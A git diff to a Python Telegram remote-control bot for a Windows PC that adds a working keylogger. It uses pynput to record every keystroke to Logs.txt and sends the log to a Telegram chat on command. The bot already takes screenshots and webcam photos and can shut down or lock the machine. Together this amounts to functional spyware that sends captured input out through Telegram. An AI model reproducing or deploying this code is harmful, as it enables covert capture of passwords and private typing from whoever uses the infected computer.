keylogger added

+++ modules/host.py
@@ -20,6 +20,10 @@ import mouse
 import psutil
 # ip
 import socket
+# keylogger
+# ! pip install pynput
+import pynput
+from pynput.keyboard import Key, Listener
 # modules
 from inputData import getData, Data
 
@@ -35,7 +39,8 @@ from inputData import getData, Data
 # pause sound / video
 # next/previous sound/video
 
-# keylogger
+# gui
+
 
 #/ done ✅
 #* brightness up/down
@@ -43,6 +48,7 @@ from inputData import getData, Data
 
 #* screenshot
 #* webcam photo
+#* keylogger
 
 #* check battery
 #* get ip
@@ -62,6 +68,7 @@ from inputData import getData, Data
 #* stop bot
 
 
+
 #? global variables
 #/ bot
 user = getData()
@@ -72,8 +79,14 @@ volDevices = AudioUtilities.GetSpeakers()
 volInterface = volDevices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
 vol = cast(volInterface, POINTER(IAudioEndpointVolume))
 
-#/ bool variable for function "sleep"
-flag = False
+#/ sleep
+sleepFlag = False
+
+# / keylogger
+keyloggerFlag = False
+count = 0
+keys = []
+
 
 print('🚀 Bot launched')
 # bot.send_message(user.ID, '🚀 Bot launched')
@@ -83,6 +96,7 @@ print('🚀 Bot launched')
 @bot.message_handler(commands = ['start'])
 def Start(message):
     bot.send_message(message.chat.id, '🚀  Bot launched')
+    bot.send_message(message.chat.id, 'Use  */help*  for more info', parse_mode = 'Markdown')
 
 
 
@@ -94,6 +108,7 @@ def Help(message):
 *ℹ️  /help* - Commands list\n
 *🏞  /screenshot* - Take screenshot\n
 *📸  /webcam* - Take webcam photo\n
+*⌨️  /keylogger* - Start keylogger\n
 *🔊  /volume* - Set volume to [value]\n
 *☀️  /brightness* - Set brightness to [value]\n
 *🖱  /mouse* - Set mouse position\n
@@ -114,11 +129,13 @@ def Help(message):
 @bot.message_handler(commands = ['screenshot', 'screen'])
 def Screenshot(message):
     if message.chat.id != user.ID:
-        return Warning(message)
+        return Warn(message)
     bot.send_chat_action(user.ID ,'upload_photo')
     bot.send_message(message.chat.id, '*Done ✅*', parse_mode = 'Markdown')
     with mss() as screen:
         screen.shot(mon = -1, output = 'Screenshot.png')
+    if not os.path.exists('./Screenshot.png'):
+        return bot.send_message(message.chat.id, '*🏞  Error*, screenshot not found', parse_mode = 'Markdown')
     bot.send_document(message.chat.id, open('Screenshot.png', 'rb'))
     os.remove('Screenshot.png')
 
@@ -127,8 +144,8 @@ def Screenshot(message):
 @bot.message_handler(commands = ['webcam', 'cam'])
 def Webcam(message):
     if message.chat.id != user.ID:
-        return Warning(message)
-    bot.send_chat_action(user.ID ,'upload_photo')
+        return Warn(message)
+    bot.send_chat_action(message.chat.id, 'upload_photo')
     os.system('python webcam.py')
     if not os.path.exists('./Webcam.png'):
         return bot.send_message(message.chat.id, '*⛔  Error*, can\'t access camera', parse_mode = 'Markdown')
@@ -138,10 +155,52 @@ def Webcam(message):
 
 
 
+# TODO keylogger
+@bot.message_handler(commands = ['keylogger', 'key', 'log'])
+def Keylogger(message):
+    if message.chat.id != user.ID:
+        return Warn(message)
+    global keyloggerFlag
+    keyloggerFlag = False
+    markupInlineDisableKeylogger = types.InlineKeyboardMarkup()
+    btnDisableKeylogger = types.InlineKeyboardButton(text = 'Disable', callback_data = 'disableKeylogger')
+    markupInlineDisableKeylogger.add(btnDisableKeylogger)
+    bot.send_message(message.chat.id, '⌨️  Keylogger *activated*', parse_mode = 'Markdown', reply_markup = markupInlineDisableKeylogger)
+    if os.path.exists('./Logs.txt'):
+        os.remove('Logs.txt')
+    with Listener(on_press = onPress, on_release = onRelease) as listener:
+        listener.join()
+def onPress(key):
+    global count, keys
+    keys.append(key)
+    count += 1
+    # print(f'{key} pressed')
+    if count >= 1:
+        writeFile(keys)
+        count = 0
+        keys = []
+def onRelease(key):
+    global keyloggerFlag
+    if keyloggerFlag:
+        keyloggerFlag = False
+        return False
+def writeFile(keys):
+    with open('Logs.txt', 'a') as f:
+        for key in keys:
+            k = str(key).replace('\'', '')
+            if k.find('space') > 0:
+                f.write('\n')
+            elif k.find('Key.') != -1:
+                k = k.replace('Key.', '[') + ']'
+                f.write(k.upper())
+            elif k.find('Key') == -1:
+                f.write(k)
+
+
 @bot.message_handler(commands = ['volume', 'vol'])
 def Volume(message):
     if message.chat.id != user.ID:
-        return Warning(message)
+        return Warn(message)
     currentVolume = getCurrentVolume()
     emoji = getVolumeEmoji(currentVolume)
     bot.send_message(message.chat.id, f'{emoji} Current volume is *{currentVolume}%*', parse_mode = 'Markdown')
@@ -175,7 +234,7 @@ def getVolumeEmoji(volume):
 @bot.message_handler(commands = ['brightness', 'bright'])
 def Brightness(message):
     if message.chat.id != user.ID:
-        return Warning(message)
+        return Warn(message)
     currentBrightness = getCurrentBrightness()
     emoji = getBrightnessEmoji(currentBrightness)
     bot.send_message(message.chat.id, f'{emoji} Current brightness is *{currentBrightness}%*', parse_mode = 'Markdown')
@@ -206,7 +265,7 @@ def getBrightnessEmoji(brightness):
 @bot.message_handler(commands = ['lock'])
 def Lock(message):
     if message.chat.id != user.ID:
-        return Warning(message)
+        return Warn(message)
     if platform.system() != "Windows":
         return bot.send_message(message.chat.id, 'This feature is currently working only on *Windows*', parse_mode = 'Markdown')
     ctypes.windll.user32.LockWorkStation()
@@ -217,7 +276,7 @@ def Lock(message):
 @bot.message_handler(commands = ['shutdown', 'sd'])
 def Shutdown(message):
     if message.chat.id != user.ID:
-        return Warning(message)
+        return Warn(message)
     if platform.system() != "Windows":
         return bot.send_message(message.chat.id, 'This feature is currently working only on *Windows*', parse_mode = 'Markdown')
     bot.send_message(message.chat.id, 'How many *seconds* to turn off the PC?', parse_mode = 'Markdown')
@@ -237,7 +296,7 @@ def Shutdown_process(message):
 @bot.message_handler(commands = ['reboot', 'rb'])
 def Reeboot(message):
     if message.chat.id != user.ID:
-        return Warning(message)
+        return Warn(message)
     if platform.system() != "Windows":
         return bot.send_message(message.chat.id, 'This feature is currently working only on *Windows*', parse_mode = 'Markdown')
     bot.send_message(message.chat.id, 'How many *seconds* to restart the PC?', parse_mode = 'Markdown')
@@ -257,16 +316,16 @@ def Reboot_process(message):
 @bot.message_handler(commands = ['sleep'])
 def Sleep(message):
     if message.chat.id != user.ID:
-        return Warning(message)
-    global flag
-    flag = False
+        return Warn(message)
+    global sleepFlag
+    sleepFlag = False
     if platform.system() != "Windows":
         return bot.send_message(message.chat.id, 'This feature is currently working only on *Windows*', parse_mode = 'Markdown')
     bot.send_message(
         message.chat.id, 'How many *seconds* to sleep?', parse_mode = 'Markdown')
     bot.register_next_step_handler(message, Sleep_process)
 def Sleep_process(message):
-    global flag
+    global sleepFlag
     if not message.text.isdigit():
         return bot.send_message(message.chat.id, 'Time must be a number')
     seconds = int(message.text)
@@ -276,8 +335,8 @@ def Sleep_process(message):
     bot.send_message(message.chat.id, f'💤  Sleeping in *{seconds}s*', parse_mode = 'Markdown', reply_markup = markupInlineCancelSleep)
     for i in range(seconds):
         time.sleep(1)
-        if flag:
-            flag = False
+        if sleepFlag:
+            sleepFlag = False
             return
     os.system('shutdown /h')
 
@@ -286,7 +345,7 @@ def Sleep_process(message):
 @bot.message_handler(commands = ['battery'])
 def Battery(message):
     if message.chat.id != user.ID:
-        return Warning(message)
+        return Warn(message)
     battery = getBattery()
     status = isCharging()
     msg = f'{getBatteryEmoji(battery)}  Battery level is *{battery}*%\n'
@@ -312,7 +371,7 @@ def chargingEmoji(status):
 @bot.message_handler(commands = ['ip'])
 def SendIP(message):
     if message.chat.id != user.ID:
-        return Warning(message)
+        return Warn(message)
     ip = getIP()
     bot.send_message(message.chat.id, f'🛰️ Your *IP* is *{ip}*', parse_mode = 'Markdown')
 def getIP():
@@ -320,10 +379,16 @@ def getIP():
 
 
 
+@bot.message_handler(commands = ['getId', 'id'])
+def getID(message):
+    bot.send_message(message.from_user.id, f'🆔  Your *ID* is *{message.from_user.id}*', parse_mode = 'Markdown')
+
+
+
 @bot.message_handler(commands = ['info', 'pc', 'pc_info'])
 def PcInfo(message):
     if message.chat.id != user.ID:
-        return Warning(message)
+        return Warn(message)
     uname = platform.uname()
 
     msg = '⚙️  *Info about your PC*\n\n'
@@ -344,7 +409,7 @@ def PcInfo(message):
 @bot.message_handler(commands = ['status', 'pc_status'])
 def PcStatus(message):
     if message.chat.id != user.ID:
-        return Warning(message)
+        return Warn(message)
     virtualMem = psutil.virtual_memory()
     battery = getBattery()
     status = isCharging()
@@ -370,9 +435,20 @@ def getSize(bytes, suffix="B"):
 
 
 
-#################/                    -| callback handler |-                    /#############################
+@bot.message_handler(commands = ['stop'])
+def stopBot(message):
+    if message.chat.id != user.ID:
+        return Warn(message)
+    bot.send_message(message.chat.id, '*⛔  Bot stopped*', parse_mode = 'Markdown')
+    bot.stop_polling()
+    print('⛔ Bot stopped')
+    sys.exit()
+
+
+
+#################/              -| callback handler |-             /#############################
 @bot.callback_query_handler(func = lambda call: True)
-def ShutdownCancel(call):
+def TurnOffCallback(call):
     if call.data == 'cancelShutdown':
         os.system('shutdown /a')
         bot.send_message(call.message.chat.id, '🛑  Shutdown *canceled*', parse_mode = 'Markdown')
@@ -380,39 +456,38 @@ def ShutdownCancel(call):
         os.system('shutdown /a')
         bot.send_message(call.message.chat.id, '🛑  Reboot *canceled*', parse_mode = 'Markdown')
     elif call.data == 'cancelSleep':
-        global flag
-        flag = True
+        global sleepFlag
+        sleepFlag = True
         bot.send_message(call.message.chat.id, '🛑  Sleep *canceled*', parse_mode = 'Markdown')
+    elif call.data == 'disableKeylogger':
+        global keyloggerFlag, keys
+        keys = []
+        bot.send_chat_action(call.message.chat.id, 'upload_document')
+        keyloggerFlag = True
+        bot.send_message(call.message.chat.id, '⛔  Keylogger *disactivated*', parse_mode = 'Markdown')
+        if not os.path.exists('./Logs.txt'):
+            bot.send_message(call.message.chat.id, '*📄  Error*, logs not found', parse_mode = 'Markdown')
+        bot.send_message(call.message.chat.id, '*Done ✅*', parse_mode = 'Markdown')
+        bot.send_document(call.message.chat.id, open('Logs.txt', 'rb'))
+        os.remove('Logs.txt')
 
 
 
-
-def Warning(message):
+def Warn(message):
     bot.send_chat_action(message.chat.id, 'typing')
-    msg = f"Someone just used  *{message.text}*\n\n"
-    msg += f"Username:  *@{message.from_user.username}*\n"
-    msg += f"First Name:  *{message.from_user.first_name}*\n"
+    bot.send_chat_action(user.ID, 'typing')
+    # other user
+    bot.send_message(message.chat.id, '⚠️  *Warning*\n\n' + 'You are not allowed to use this bot', parse_mode = 'Markdown')
+    # main
+    msg = f'*⚠️  Someone just used  {message.text}*\n\n'
+    if message.from_user.username != None:
+        msg += f'Username:  *@{message.from_user.username}*\n'
+    if message.from_user.first_name != None:
+        msg += f'First Name:  *{message.from_user.first_name}*\n'
     if message.from_user.last_name != None:
-        msg += f"Last Name:  *{message.from_user.last_name}*\n"
-    msg += f"User Id:  *{message.from_user.id}*\n"
+        msg += f'Last Name:  *{message.from_user.last_name}*\n'
+    msg += f'User Id:  *{message.from_user.id}*\n\n'
     bot.send_message(user.ID, f'{msg}', parse_mode = 'Markdown')
-
-
-
-@bot.message_handler(commands = ['getId', 'id'])
-def getID(message):
-    bot.send_message(message.from_user.id, f'🆔  Your *ID* is *{message.from_user.id}*', parse_mode = 'Markdown')
-
-
-
-@bot.message_handler(commands = ['stop'])
-def stopBot(message):
-    if message.chat.id != user.ID:
-        return Warning(message)
-    bot.send_message(message.chat.id, '*Bot stopped* ✅', parse_mode = 'Markdown')
-    bot.stop_polling()
-    print('⛔ Bot stopped')
-    sys.exit()
